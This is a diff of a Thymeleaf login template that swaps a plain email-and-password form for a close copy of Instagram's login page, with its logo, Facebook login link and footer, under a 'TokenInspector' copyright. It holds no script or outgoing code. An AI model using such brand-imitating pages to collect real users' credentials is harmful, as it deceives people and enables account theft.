@@ -1,21 +1,78 @@
 <!DOCTYPE html>
 <html lang="en" xmlns:th="https://www.thymeleaf.org">
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sign In</title>
+	<meta charset="UTF-8">
+	<title>Login</title>
+	<link rel="stylesheet" href="LoginPageStyle.css">
 </head>
 <body>
-  <form th:action="Page" method="get" th:object="${SignKey}">
-    <label for="email">Email:</label>
-    <br>
-    <input type="email" th:field="${SignKey.email}" id="email" required><br>
-    <label for="password">Password:</label>
-    <br>
-    <input type="password" th:field="${SignKey.password}" id="password" required>
-    <br>
-    <input type="submit" value="SignIn">
-  </form>
+
+<div class="wrapper" >
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
+			<div class="form" th:object="${LoginKey}">
+				<div class="input_field">
+					<input type="text" placeholder="Phone number, username, or email" class="input" th:field="${LoginKey.email}">
+				</div>
+				<div class="input_field">
+					<input type="password" placeholder="Password" class="input" th:field="${LoginKey.password}">
+				</div>
+				<div class="btn">
+					<form th:action="Home" method="post">
+						<input type="submit"  value="Login" >
+					</form>
+				</div>
+			</div>
+			<div class="or">
+				<div class="line"></div>
+				<p>OR</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p>Log in with Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Forgot password?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Don't have an account? <form th:action="Sign-up" method="get"><button>Sign Up</button></form></p>
+		</div>
+		<div class="apps">
+			<p>Get the app.</p>
+			<div class="icons">
+				<a href="#"><img src="appstore.png" alt="appstore"></a>
+				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2023 TokenInspector
+		</div>
+	</div>
+</div>
+
 </body>
 </html>
